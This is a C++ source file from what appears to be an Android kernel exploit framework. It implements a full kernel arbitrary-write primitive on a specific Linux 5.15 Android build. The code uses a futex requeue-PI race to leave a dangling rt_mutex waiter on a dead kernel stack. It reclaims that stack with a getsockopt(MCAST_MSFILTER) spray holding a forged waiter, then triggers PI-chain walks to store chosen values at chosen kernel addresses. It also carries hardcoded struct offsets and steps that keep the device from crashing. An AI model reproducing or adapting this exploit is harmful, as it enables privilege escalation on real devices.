#include "routes/multicast_waiter_route.h"

#include <netinet/in.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

/* bionic exposes MCAST_MSFILTER through <linux/in.h>; keep the value explicit
 * so the calibration build never depends on the header set. */
#ifndef MCAST_MSFILTER
#define MCAST_MSFILTER 48
#endif

#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "common.h"
#include "session/exploit_session.hpp"
#include "target.h"

using namespace ghostlock;

/* Resident Multicast Waiter route owner (CPP13). The process-level instance
 * lives at file scope so every inlined access expands exactly like the
 * validated direct reference; the kernel5_resident_* wrappers in
 * route_operations.cpp forward to it. The two workers and the disarm/destroy
 * helpers stay translation-unit local. */

namespace {

MulticastWaiterRoute multicast_resident_route;

static double fops_elapsed_ms(struct timespec *ref) {
    return runtime_elapsed_ms(ref);
}

static const struct execution_settings *resident_execution_settings(void) {
    return target_profile_execution(&g_exploit_session.profile);
}

/* Settle between the respraying setsockopt and the scheduling change that
 * walks the PI chain.
 *
 * The forged waiter is written into the reclaiming syscall's kernel stack
 * frame. Reclaiming and walking it are two different threads, so a walk that
 * starts while the copy is still in flight observes a half-written object and
 * faults inside rt_mutex_adjust_prio_chain() (observed as waiter->lock == 0,
 * i.e. all zeroes at the first field the walk reads after a valid
 * waiter->task). Give the copy a bounded moment to land before triggering the
 * walk. Overridable at runtime for device tuning; the app passes
 * GHOSTLOCK_MCAST_SETTLE_US through to the native binary. */
static useconds_t multicast_post_spray_settle_us(void) {
    static useconds_t cached = 0;
    if (!cached) {
        useconds_t v = 500;
        const char *env = getenv("GHOSTLOCK_MCAST_SETTLE_US");
        if (env && *env) {
            const unsigned long parsed = strtoul(env, nullptr, 0);
            if (parsed > 0 && parsed <= 200000UL)
                v = static_cast<useconds_t>(parsed);
        }
        cached = v ? v : 1;
    }
    return cached;
}

static void multicast_waiter_interrupt(int sig) {
    (void) sig;
}

static long multicast_waiter_adjust(MulticastWaiterRouteContext *context) {
    struct sched_param sp = {.sched_priority = 0};
    int next = context->scheduler_policy == SCHED_NORMAL
            ? SCHED_BATCH : SCHED_NORMAL;
    long r = syscall(SYS_sched_setscheduler,
            atomic_load(&context->waiter_tid), next, &sp);
    context->scheduler_policy = next;
    return r;
}

/* Calibration: write one unique non-canonical marker per 8-byte slot instead
 * of the encoded waiter, so a PI-walk fault reports the buffer offset that
 * landed on the field the walk dereferenced. */
static int multicast_marker_mode(void) {
    static int cached = -1;
    if (cached < 0)
        cached = getenv("GHOSTLOCK_MCAST_MARKER") ? 1 : 0;
    return cached;
}

/* Cleanup stamp after a successful write: on by default, disable with
 * GHOSTLOCK_MCAST_CLEANUP=0 to compare against the un-cleaned behaviour. */
static int multicast_cleanup_enabled(void) {
    static int cached = -1;
    if (cached < 0) {
        const char *v = getenv("GHOSTLOCK_MCAST_CLEANUP");
        cached = (v && v[0] == '0' && v[1] == '\0') ? 0 : 1;
    }
    return cached;
}

/* Terminator write (B): task_struct::pi_blocked_on on this kernel - the profile
 * carries the same value as task_pi_blocked_on (0x8b0 for
 * 5.15.180-android13-8-o-01176-g6333b0dbc8ed). Zeroing the fixture task's field
 * makes every later PI traversal stop there instead of chasing the dead
 * waiter's stack, which is what wedges the machine once this process exits.
 * Disable with GHOSTLOCK_MCAST_SCRUB=0. */
#define MCAST_TASK_PI_BLOCKED_ON_OFF 0x8b0u

static int multicast_scrub_enabled(void) {
    static int cached = -1;
    if (cached < 0) {
        const char *v = getenv("GHOSTLOCK_MCAST_SCRUB");
        cached = (v && v[0] == '0' && v[1] == '\0') ? 0 : 1;
    }
    return cached;
}

/* A: pre-write normalisation of the fixture task's PI state. The kernel reads
 * pi_lock/pi_waiters/pi_top_task when it walks the chain; leaving stale
 * rb_node/owner values there is what lets the walk leave our structures and
 * end up chasing a waiter on a freed stack. Offsets are this kernel's
 * task_struct fields (same values the profile carries as task_pi_*).
 * Runs before the real write; disable with GHOSTLOCK_MCAST_PREP=0. */
#define MCAST_TASK_PI_LOCK_OFF 0x884u
#define MCAST_TASK_PI_WAITERS_OFF 0x898u
#define MCAST_TASK_PI_TOP_TASK_OFF 0x8a8u

static int multicast_prep_enabled(void) {
    static int cached = -1;
    if (cached < 0) {
        const char *v = getenv("GHOSTLOCK_MCAST_PREP");
        cached = (v && v[0] == '0' && v[1] == '\0') ? 0 : 1;
    }
    return cached;
}

/* A2 (fixture lock normalisation) stays off: it silences the panic but also
 * removes the rbtree rotation that performs the target write. */
static int multicast_prep_lock_enabled(void) {
    /* With the use-once lease below every lock is pristine by construction, so
     * there is nothing to normalise: this stays OFF unless explicitly asked for
     * (GHOSTLOCK_MCAST_PREP_LOCK=1) or the legacy rotating-slot layout is forced
     * (GHOSTLOCK_LOCK_ROTATE=1), where the same slot is reused and would
     * otherwise carry waiters.rb_root/rb_leftmost from the previous walk. */
    const char *v = getenv("GHOSTLOCK_MCAST_PREP_LOCK");
    if (v) return !(v[0] == '0' && v[1] == '\0');
    return getenv("GHOSTLOCK_LOCK_ROTATE") != nullptr;
}

/* One walk = one lock.
 *
 * rt_mutex_enqueue() -> rb_add_cached() leaves the lock it was called on with
 * waiters.rb_root == waiters.rb_leftmost == &waiter->tree_entry.  A second walk
 * on that same lock then takes the inlined rb_next() path
 * (0x9c3e640 cmp x8,x28 -> 0x9c3e65c ldr x10,[x8,#8] -> deref) and dies, which
 * is exactly the measured BUG at rtmutex_common.h:118 plus the self-referential
 * rb_leftmost.  So the address handed to the walk as waiter->lock must be a
 * pristine, EMPTY rt_mutex_base{wait_lock@0x00, waiters@0x08, owner@0x18} every
 * single time: non-overlapping 0x20-byte slots carved out of the fixture page,
 * each used once.  The slot table in the profile (0x80 + i*8, stride 8) both
 * overlapped (a walk's rb_root/rb_leftmost land on the next slot's fields) and
 * only had 12 entries, so it corrupted itself after two or three walks.
 *
 * The harness restarts the guest between rounds and clear_bss() zeroes the
 * fixture page again, so no re-zeroing is needed inside a round.
 * GHOSTLOCK_LOCK_ROTATE=1 keeps the legacy overlapping table for A/B. */
static uintptr_t multicast_lock_lease(MulticastWaiterRouteContext *context) {
    if (getenv("GHOSTLOCK_LOCK_ROTATE")) {
        const size_t n = context->layout.lock_slot_count
                ? context->layout.lock_slot_count : 1;
        return context->lock + context->layout.lock_slots_offset +
                ((size_t) context->lock_slot++ % n) * context->layout.lock_slot_stride;
    }
    size_t slots = (context->task > context->lock)
            ? (size_t) (context->task - context->lock) / 0x20 : 1;
    if (slots > 64) slots = 64;
    if (!slots) slots = 1;
    const size_t index = (size_t) (context->lock_slot++ % slots);
    return context->lock + index * 0x20;
}

/* Ask the worker to stamp the buffer again (it owns the kernel frame). */
static void multicast_request_respray(MulticastWaiterRouteContext *context,
        uintptr_t target, uintptr_t value) {
    context->target = target;
    context->value = value;
    atomic_store(&context->sprayed, 0);
    atomic_store(&context->respray_requested, 1);
    while (!atomic_load(&context->sprayed)) sched_yield();
}

/* Stack spray primitive.
 *
 * getsockopt(IPPROTO_IP, MCAST_MSFILTER) copies
 *   size0 = offsetof(struct group_filter, gf_slist_flex) = 0x90 bytes
 * of user data into a stack local of do_ip_getsockopt() (sp + 0x128 here); the
 * copy length is fixed by the kernel, optlen only has to be >= 0x90.
 *
 * The dispatch chain depends on the socket type (measured on the device with a
 * kprobe on __arch_copy_from_user, depth = task->stack + 0x4000 - dest):
 *   UDP/raw  0x3d0 + udp_getsockopt 0x10 + ip_getsockopt 0x50 + do_ip 0x2a0
 *            = 0x6d0 -> copy lands at depth 0x798 (0x30 ABOVE the waiter: only
 *            task/lock/wake_state/prio/deadline/ww_ctx are covered)
 *   TCP      0x3d0 + tcp_getsockopt 0x40 + ip_getsockopt 0x50 + do_ip 0x2a0
 *            = 0x700 -> copy lands at depth 0x7c8 == the waiter base, so the
 *            whole 0x58-byte struct (tree_entry first) is inside the buffer and
 *            mcast_waiter_off is 0. tcp_getsockopt() forwards every level other
 *            than SOL_TCP to icsk_af_ops->getsockopt == ip_getsockopt, so no
 *            connection is required.
 * gf_group.sa_family at buffer + 8 is AF_UNSPEC, so ip_mc_gsfget() bails out
 * before writing anything back over the sprayed bytes. */
static int multicast_waiter_spray(MulticastWaiterRouteContext *context,
        unsigned char *buffer, size_t size) {
    socklen_t len = (socklen_t) size;
    if (size < 0x90) return -1;
    return getsockopt(context->socket_fd, IPPROTO_IP, MCAST_MSFILTER,
            buffer, &len);
}

/* Socket variant used for the spray. The copy depth is decided by the dispatch
 * chain down to do_ip_getsockopt() (every frame below measured on this build):
 *   AF_INET / UDP    entry 0x3d0 + udp_getsockopt 0x10 + ip_getsockopt 0x50
 *                    + do_ip_getsockopt 0x2a0 = 0x6d0 -> depth 0x798
 *                    (waiter only from +0x30 on: mcast_waiter_off = -0x30)
 *   AF_INET / TCP    tcp_getsockopt tail-calls ip_getsockopt -> depth 0x788
 *   AF_INET6 / any   ipv6_getsockopt 0x50 (its SOL_IP branch calls
 *                    udp_prot.getsockopt, a real call, verified in machine
 *                    code) then udp_getsockopt 0x10 + ip_getsockopt 0x50:
 *                      SOCK_STREAM 0x3d0+0x50+0x10+0x50+0x2a0 -> depth 0x7e8
 *                      SOCK_DGRAM  0x3d0+0x10+0x50+0x10+0x50+0x2a0 -> 0x7f8
 *                    Both put the whole 0x58-byte waiter inside the 0x90-byte
 *                    buffer with a non-negative mcast_waiter_off (0x20/0x30).
 * Device-measured so far: AF_INET/UDP 0x798, AF_INET/TCP 0x788.
 * GHOSTLOCK_MCAST_SOCKET=udp|tcp|udp6|tcp6 calibrates this at runtime. */
static const char *multicast_socket_variant(void) {
    const char *v = getenv("GHOSTLOCK_MCAST_SOCKET");
    return (v && *v) ? v : "tcp6";
}

static int multicast_make_socket(void) {
    const char *v = multicast_socket_variant();
    if (strcmp(v, "udp") == 0)
        return socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (strcmp(v, "tcp") == 0)
        return socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (strcmp(v, "udp6") == 0)
        return socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    return socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
}

static int multicast_waiter_stamp(MulticastWaiterRouteContext *context,
        uintptr_t target, uintptr_t value,
        uintptr_t lock) {
    size_t size = context->layout.buffer_size;
    /* Kept dynamic: the size comes from validated profile geometry and
     * heap-backing it would enter the race window (CPP17 review, retained). */
    __extension__ unsigned char b[size];
    size_t o = context->layout.waiter_offset;
    /* Fixture audit: the walk takes its lock from waiter->lock (+0x38) only, so
     * log exactly what is being stamped (first few shots + every store shot). */
    {
        static int audit;
        if (value || audit < 6) {
            audit++;
            pr_info("mcast stamp target=%#zx value=%#zx lock=%#zx waiter_off=%zu "
                    "task=%#zx size=%zu\n",
                    target, value, lock, o, context->task, size);
        }
    }
    memset(b, 0, sizeof(b));
    if (multicast_marker_mode()) {
        for (size_t i = 0; i + 8 <= size; i += 8) {
            uint64_t marker = 0x1000000000000000ULL | (uint64_t) i;
            memcpy(b + i, &marker, sizeof(marker));
        }
        uint16_t family = AF_UNSPEC;
        memcpy(b + 4, &family, sizeof(family));
        memcpy(b + 8, &family, sizeof(family));
        return multicast_waiter_spray(context, b, size);
    }
    /* Same pure encoder as the one-shot route; the resident also stamps the
     * erase words at the waiter head.
     *
     * GHOSTLOCK_KEEP_REAL_IDS=1 skips the task/lock stamp so the frame keeps the
     * identity the kernel itself wrote when it enqueued the real waiter.  That
     * identity is exactly what rt_mutex_top_waiter() asserts:
     *     BUG_ON(w->lock != lock);        kernel/locking/rtmutex_common.h:118
     * and the write shot reaches it -- measured "kernel BUG at
     * kernel/locking/rtmutex_common.h:118", pc = walk+0xe50, which disassembles
     * to the BUG() (brk #0x800) block.  Leaving the real lock/task alone keeps
     * that check satisfied, so the walk can do a genuine erase/relink on the node
     * the kernel queued -- which is where the store *(target) = value comes from. */
    if (!getenv("GHOSTLOCK_KEEP_REAL_IDS")) {
        if (!encode_multicast_waiter(
                {reinterpret_cast<std::byte *>(b), size},
                o, context->layout.task_offset, context->layout.lock_offset,
                context->task, lock)) {
            return -1;
        }
    }
    /* The PI walk that sched_setscheduler()/sched_setattr() triggers walks
     * task->pi_waiters, so the nodes it touches are pi_tree_entry at +0x18 --
     * NOT tree_entry at +0x00.  Stamping the head left the pi_tree fields at
     * zero (measured in the QEMU sandbox: +0x18/+0x20/+0x28 all 0), so the walk
     * never saw our forged links: the erase relink that performs
     * *(target) = value never ran, and the chain walk spun forever in its
     * retry loop (soft lockup at _raw_spin_unlock_irq, lr = walk+0x1a8).
     * GHOSTLOCK_STAMP_HEAD=1 restores the old head placement for A/B. */
    /* Which shots must NOT enter the update pass, and which must?
     *
     * The walk does an atomic CAS on the forged lock:  casa 0 -> 1, [lock]
     * (rt_mutex.owner, lock+0x00).  It succeeds once; every later replay of the
     * walk fails it and takes the "cannot take the lock" path -- unlock_irq,
     * yield, jump back to the top of the function -- forever (measured: pc =
     * _raw_spin_unlock_irq, lr = rt_mutex_adjust_prio_chain+0x1a8, registers
     * identical across watchdog reports, i.e. a livelock, not a held lock).
     * The retry exit test is  waiter->prio (waiter+0x44) == task->prio
     * (task+0x7c); stamping it equal makes the walk take out_unlock before any
     * of that, which is exactly what the housekeeping shots need.
     *
     * Every housekeeping shot (arming, cleanup, scrub, the three prep shots)
     * passes value == 0, so they all get the early exit and converge.  Only the
     * real W1 store has a non-zero word, and that one MUST enter the update pass,
     * because the store *(target) = value is a by-product of the rb_erase relink
     * that pass performs on our forged node.  Keying this on target instead of
     * value left the prep shots unprotected and they livelocked before the write
     * ever ran (measured).
     *
     * GHOSTLOCK_WAITER_PRIO overrides the stamped value;
     * GHOSTLOCK_WAITER_PRIO_ALWAYS=1 stamps it for the store too (diagnostic). */
    {
        const char *pe = getenv("GHOSTLOCK_WAITER_PRIO");
        const bool always = getenv("GHOSTLOCK_WAITER_PRIO_ALWAYS") != nullptr;
        if (!value || always) {
            const unsigned long prio = (pe && *pe) ? strtoul(pe, nullptr, 0) : 120UL;
            support::put32(b, o + 0x44, (uint32_t) prio);
        }
    }
    if (target) {
        /* tcp6/udp6 carry the whole 0x58-byte waiter (off=+0x20/+0x30), so both
         * rb heads are ours to write.  The function that BUGs on w->lock != lock
         * is rt_mutex_top_waiter():
         *     leftmost = rb_first_cached(&lock->waiters);
         *     w = rb_entry(leftmost, struct rt_mutex_waiter, tree_entry);
         *     BUG_ON(w->lock != lock);
         * i.e. it takes its node from the TREE head at +0x00 (rb_first_cached
         * returns waiters.rb_leftmost, and rb_entry uses tree_entry), NOT from
         * the pi head at +0x18 that this route used to stamp.  With the pi-only
         * placement the node the assert inspects was one the kernel/spray never
         * wrote, so the identity check could not hold (measured: BUG at
         * rtmutex_common.h:118, pc = walk+0xe50, via __sched_setscheduler).
         * Store shots now stamp the erase-left-only shape on the tree head
         *     { __rb_parent_color = value, rb_right = 0, rb_left = target }
         * which is the relink that performs *(target) = value, and leave the pi
         * head empty/self-parented so the pi_waiters traversal stays sane.
         * GHOSTLOCK_STAMP_HEAD=1 restores the old pi-head-only placement for A/B. */
        const bool old_head = getenv("GHOSTLOCK_STAMP_HEAD") != nullptr;
        const size_t node = old_head ? o + 0x18 : o;
        /* GHOSTLOCK_LEAF_STORE=1 selects the leaf arm on purpose.  Measured
         * 2026-09-23: with it the store no longer reaches the target at all
         * (enforcing stayed 01 while the requested word went nowhere), i.e.
         * rb_right == 0 sends the relink to value+8/value+0x10 instead of to
         * rb_left.  Default stays on the shape that does land (zero write near
         * the target) until the pointer-write path is ported properly. */
        if (!old_head) {
            /* tree_entry is the node the walk erases (0x9c3e674:
             * `add x1,x27,#8 ; bl rb_erase`), so its fields decide which arm of
             * rb_erase runs:
             *   +0x00 __rb_parent_color = (target-8)&~3   -> parent = target-8
             *          and != &tree_entry, otherwise RB_EMPTY_NODE() at 0x9c3e634
             *          skips the whole erase
             *   +0x08 rb_right           = value, must be non-zero (0 sends it
             *          into the rebalance path / rb_next deref)
             *   +0x10 rb_left            = 0 (0x91da3d0 `cbz x9` -> Case 1)
             * Case 1 then stores *(target) = value -- unless *(target+8) happens
             * to equal this node, in which case the other branch writes target+8. */
            support::put64(b, node, (target - 8) & ~(uintptr_t) 3);
            support::put64(b, node + 8, value);
            support::put64(b, node + 16, 0);
        } else if (value && getenv("GHOSTLOCK_LEAF_STORE")) {
            /* Leaf geometry, matching the erase relink *(rb_left) = pc
             * (upstream fops.c: relink_left = fake_right ? target : left):
             *   rb_parent_color := value    (the word to store)
             *   rb_right        := 0        (selects the leaf arm)
             *   rb_left         := target   (the destination)
             * The old shape -- pc = (target-8), rb_right = value, rb_left unset --
             * selects the one-child arm and stores 0 near the target instead of
             * the requested word (measured in the QEMU sandbox 2026-09-23:
             * init_task+0x8 went 0x42f94000 -> 0 while the requested word never
             * appeared).  Housekeeping shots (value == 0) keep the old shape,
             * because pc == 0 would leave the node parentless. */
            support::put64(b, node, value);
            support::put64(b, node + 8, 0);
            support::put64(b, node + 16, target);
        } else {
            support::put64(b, node, (target - 8) & ~(uintptr_t) 3);
            support::put64(b, node + 8, value);
        }
    }
    uint16_t family = AF_UNSPEC;
    memcpy(b + 8, &family, sizeof(family));
    return multicast_waiter_spray(context, b, size);
}

static void *multicast_waiter_worker(void *arg) {
    auto *context = static_cast<MulticastWaiterRouteContext *>(arg);
    pin_to_core((size_t) context->consumer_cpu);
    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGUSR1);
    pthread_sigmask(SIG_UNBLOCK, &set, nullptr);
    atomic_store(&context->waiter_tid, (int) syscall(SYS_gettid));
    support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
    atomic_store(&context->waiter_has_lock2, 1);
    while (!atomic_load(&context->owner_has_lock1)) sched_yield();
    atomic_store(&context->waiter_waiting, 1);
    support::futex_op(&context->condition_futex, FUTEX_WAIT_REQUEUE_PI_PRIVATE,
            0, nullptr, &context->lock1_futex, 0);
    context->socket_fd = multicast_make_socket();
    if (context->socket_fd < 0) return nullptr;
    pr_info("mcast spray socket variant=%s waiter_off=%zu buffer=%zu\n",
            multicast_socket_variant(), context->layout.waiter_offset,
            context->layout.buffer_size);
    multicast_waiter_stamp(context, 0, 0, context->lock);
    atomic_store(&context->waiter_ready, 1);
    while (!atomic_load(&context->stop_requested)) {
        if (atomic_exchange(&context->respray_requested, 0)) {
            multicast_waiter_stamp(context, context->target, context->value,
                    multicast_lock_lease(context));
            atomic_store(&context->sprayed, 1);
        }
        sched_yield();
    }
    uint32_t dummy = 0x80000000U | (uint32_t) getpid();
    struct timespec z = {0, 0};
    support::futex_op(&dummy, FUTEX_LOCK_PI_PRIVATE, 0, &z, nullptr, 0);
    support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
    while (!atomic_load(&context->owner_done)) sched_yield();
    close(context->socket_fd);
    context->socket_fd = -1;
    return nullptr;
}

static void *multicast_owner_worker(void *arg) {
    auto *context = static_cast<MulticastWaiterRouteContext *>(arg);
    pin_to_core((size_t) context->main_cpu);
    while (!atomic_load(&context->waiter_has_lock2)) sched_yield();
    support::futex_op(&context->lock1_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
    atomic_store(&context->owner_has_lock1, 1);
    atomic_store(&context->owner_waiting, 1);
    support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
    support::futex_op(&context->lock1_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
    support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
    atomic_store(&context->owner_done, 1);
    return nullptr;
}

static void multicast_waiter_disarm(MulticastWaiterRouteContext *context) {
    atomic_store(&context->stop_requested, 1);
    atomic_store(&context->race->consumer_go, 0);
    while (atomic_load(&context->race->consumer_inflight)) sched_yield();
    context->status.kernel_disarmed = 1;
}

static void multicast_waiter_destroy(MulticastWaiterRouteContext *context) {
    if (context->waiter_worker_started) {
        pthread_join(context->waiter_worker, nullptr);
        context->waiter_worker_started = 0;
    }
    if (context->owner_worker_started) {
        pthread_join(context->owner_worker, nullptr);
        context->owner_worker_started = 0;
    }
    if (context->socket_fd >= 0) {
        close(context->socket_fd);
        context->socket_fd = -1;
    }
    context->ready = 0;
    context->status.userspace_clean = 1;
    if (context->status.code != ROUTE_OK && context->status.kernel_disarmed) {
        context->status.code = ROUTE_FALLBACK_SAFE;
    }
}

}  // namespace

int MulticastWaiterRoute::start() noexcept {
    auto *context = this;
    if (context->ready) return 1;
    if (context->waiter_worker_started || context->owner_worker_started) {
        pr_warning("multicast resident remains partially armed; refusing restart\n");
        return 0;
    }
    MulticastWaiterLayout layout_value =
            target_profile_multicast_waiter_layout(&g_exploit_session.profile);
    const struct execution_settings *execution = resident_execution_settings();
    context->init(
            &g_exploit_session.race, nullptr, execution, layout_value, 1);
    /* Fresh lease table for this round: each walk below takes its own pristine
     * 0x20-byte lock slot (see multicast_lock_lease). */
    context->lock_slot = 0;
    context->main_cpu = runtime_config_snapshot().main_cpu;
    context->consumer_cpu = runtime_config_snapshot().consumer_cpu;
    uintptr_t bss = resolved_addresses_data_alias(
            &g_exploit_session.addresses, KIMAGE_TEXT_BASE + layout_value.fake_bss_image_offset);
    context->lock = bss + layout_value.fake_lock_offset;
    context->task = bss + layout_value.fake_task_offset;
    pr_info("mcast fixture bss=%#zx lock=%#zx task=%#zx fake_bss_off=%#zx "
            "fake_lock_off=%#zx fake_task_off=%#zx slots_off=%#x count=%u stride=%u\n",
            bss, context->lock, context->task,
            (size_t) layout_value.fake_bss_image_offset,
            (size_t) layout_value.fake_lock_offset,
            (size_t) layout_value.fake_task_offset,
            context->layout.lock_slots_offset, context->layout.lock_slot_count,
            context->layout.lock_slot_stride);
    struct sigaction sa = {};
    sa.sa_handler = multicast_waiter_interrupt;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGUSR1, &sa, nullptr) != 0) return 0;
    if (pthread_create(&context->waiter_worker, nullptr,
            multicast_waiter_worker, context) != 0)
        return 0;
    context->waiter_worker_started = 1;
    if (pthread_create(&context->owner_worker, nullptr,
            multicast_owner_worker, context) != 0)
        return 0;
    context->owner_worker_started = 1;
    struct timespec ready_started;
    clock_gettime(CLOCK_MONOTONIC, &ready_started);
    while (!(atomic_load(&context->waiter_has_lock2) &&
            atomic_load(&context->owner_has_lock1) &&
            atomic_load(&context->waiter_waiting) &&
            atomic_load(&context->owner_waiting))) {
        if (fops_elapsed_ms(&ready_started) >= execution->multicast_ready_timeout_ms)
            return 0;
        sched_yield();
    }
    usleep(execution->multicast_post_requeue_settle_us);
    errno = 0;
    long r = support::futex_op(&context->condition_futex, FUTEX_CMP_REQUEUE_PI_PRIVATE,
            1, (void *) 0, &context->lock1_futex, 0);
    context->condition_futex = 1;
    syscall(SYS_tgkill, getpid(), atomic_load(&context->waiter_tid), SIGUSR1);
    if (r >= 0 || (errno != EDEADLK && errno != EDEADLOCK)) return 0;
    clock_gettime(CLOCK_MONOTONIC, &ready_started);
    while (!atomic_load(&context->waiter_ready) &&
            fops_elapsed_ms(&ready_started) < execution->multicast_ready_timeout_ms)
        sched_yield();
    /* Let the kernel-side copy of the stamped buffer land before the
     * scheduling change walks the chain (see multicast_post_spray_settle_us). */
    usleep(multicast_post_spray_settle_us());
    if (!atomic_load(&context->waiter_ready))
        return 0;
    if (getenv("GHOSTLOCK_5X_NOWALK")) {
        /* Calibration: leave the dead waiter and the landed copy in place and
         * park, so a kprobe/ftrace reader can measure both stack depths without
         * triggering the PI walk (which panics when the geometry is wrong). */
        pr_success("5.x NOWALK calibration: waiter tid=%d parked; adjust skipped\n",
                atomic_load(&context->waiter_tid));
        for (;;) pause();
    }
    if (multicast_waiter_adjust(context) < 0)
        return 0;
    usleep(execution->multicast_post_adjust_settle_us);
    context->ready = 1;
    context->status.code = ROUTE_OK;
    pr_success("5.x resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",
            bss, context->lock, context->task);
    return 1;
}

int MulticastWaiterRoute::write(uintptr_t target, uintptr_t value) noexcept {
    auto *context = this;
    if (!context->ready) return 0;
    context->target = target;
    context->value = value;
    if (multicast_prep_enabled()) {
        /* A: normalise the fixture task's PI state before the walk that matters. */
        static const unsigned kTaskFields[] = {
            MCAST_TASK_PI_LOCK_OFF, MCAST_TASK_PI_WAITERS_OFF,
            MCAST_TASK_PI_TOP_TASK_OFF,
        };
        for (size_t i = 0; i < sizeof(kTaskFields) / sizeof(kTaskFields[0]); i++) {
            const uintptr_t addr = context->task + kTaskFields[i];
            multicast_request_respray(context, addr, 0);
            usleep(multicast_post_spray_settle_us());
            long rr = multicast_waiter_adjust(context);
            pr_info("mcast prep: [%#zx] <- 0 ret=%ld\n", addr, rr);
        }
        /* A2: the same for the fixture lock the forged waiter points at.
         * OFF by default: the lock's owner/waiters fields carry the write -
         * zeroing them keeps the walk from panicking but also removes the
         * rbtree rotation that produces the target write (measured: ret=0 but
         * "Write 1 failed"). Enable with GHOSTLOCK_MCAST_PREP_LOCK=1 only when
         * deliberately testing the "clean lock" hypothesis. */
        if (multicast_prep_lock_enabled()) {
            /* Normalise the fixture lock into the EMPTY valid rt_mutex_base the
             * walk needs before it erases our node:
             *   wait_lock(0) / waiters.rb_node(0) / rb_leftmost(0) / owner(0).
             * Each of these is one housekeeping shot (value == 0 -> the walk
             * takes the prio-equal early exit, so it only performs the store). */
            static const unsigned kLockFields[] = {0x0u, 0x8u, 0x10u, 0x18u};
            const size_t slots = (getenv("GHOSTLOCK_LOCK_ROTATE") &&
                    context->layout.lock_slot_count)
                    ? context->layout.lock_slot_count : 1;
            for (size_t s = 0; s < slots; s++) {
                const uintptr_t slot = getenv("GHOSTLOCK_LOCK_ROTATE")
                        ? context->lock + context->layout.lock_slots_offset +
                                s * context->layout.lock_slot_stride
                        : context->lock;
                for (size_t i = 0; i < sizeof(kLockFields) / sizeof(kLockFields[0]); i++) {
                    const uintptr_t addr = slot + kLockFields[i];
                    multicast_request_respray(context, addr, 0);
                    usleep(multicast_post_spray_settle_us());
                    long rr = multicast_waiter_adjust(context);
                    pr_info("mcast prep lock: [%#zx] <- 0 ret=%ld\n", addr, rr);
                }
            }
        }
        /* leave the window benign again before the real write */
        multicast_request_respray(context, 0, 0);
        usleep(multicast_post_spray_settle_us());
        pr_success("mcast prep done; fixture PI state normalised\n");
    }
    /* the prep cycles above overwrote the request: restore it */
    context->target = target;
    context->value = value;
    atomic_store(&context->sprayed, 0);
    atomic_store(&context->respray_requested, 1);
    while (!atomic_load(&context->sprayed)) sched_yield();
    /* The worker signals `sprayed` from userspace, right after setsockopt()
     * returned; the kernel-side copy into the reclaiming stack frame is what
     * the walk consumes as the forged waiter. Settle before triggering it. */
    usleep(multicast_post_spray_settle_us());
    long r = multicast_waiter_adjust(context);
    pr_info("resident write 0x%zx -> 0x%zx ret=%ld\n", value, target, r);
    if (r == 0 && multicast_cleanup_enabled()) {
        /* Cleanup stamp. The write leaves the forged rb links in the dead
         * waiter, and any later walk that reaches it (another thread's PI
         * operation, a later sched_setscheduler, ...) keeps following them -
         * that is the state that wedges the machine even when the process is
         * parked and never exits. Re-stamp the same window with target == 0,
         * which skips the erase words and leaves exactly the encoded waiter
         * the phase-1 probe proved stable (empty rb nodes). The worker does the
         * stamp, so it lands in the reclaiming thread's kernel frame again. */
        context->target = 0;
        context->value = 0;
        atomic_store(&context->sprayed, 0);
        atomic_store(&context->respray_requested, 1);
        while (!atomic_load(&context->sprayed)) sched_yield();
        usleep(multicast_post_spray_settle_us());
        pr_success("mcast cleanup stamp landed; forged rb links dropped\n");
    }
    if (r == 0 && multicast_scrub_enabled()) {
        /* B: terminator. Each write is itself a chain walk, so the scrub write
         * has to come last: zero the fixture task's pi_blocked_on, then leave
         * the window in the benign (no erase words) shape again. */
        const uintptr_t term = context->task + MCAST_TASK_PI_BLOCKED_ON_OFF;
        multicast_request_respray(context, term, 0);
        usleep(multicast_post_spray_settle_us());
        long r2 = multicast_waiter_adjust(context);
        pr_info("mcast scrub terminator: [%#zx] <- 0 ret=%ld\n", term, r2);
        multicast_request_respray(context, 0, 0);
        usleep(multicast_post_spray_settle_us());
        pr_success("mcast scrub done; pi_blocked_on cleared\n");
    }
    return r == 0;
}

void MulticastWaiterRoute::stop() noexcept {
    auto *context = this;
    if (!context->ready) {
        if (context->waiter_worker_started || context->owner_worker_started) {
            context->status.code = ROUTE_DIRTY_FAILURE;
            pr_warning("multicast resident partial setup retained for process exit\n");
        }
        return;
    }
    multicast_waiter_disarm(context);
    multicast_waiter_destroy(context);
    /* SESSION-04: the route owns only its route resources; reaping the
     * HeapContext references is the session's step after destroy. */
    g_exploit_session.release_resident_heap();
    pr_success("5.x resident writer disarmed\n");
}

MulticastWaiterRoute &resident_route(void) {
    return multicast_resident_route;
}
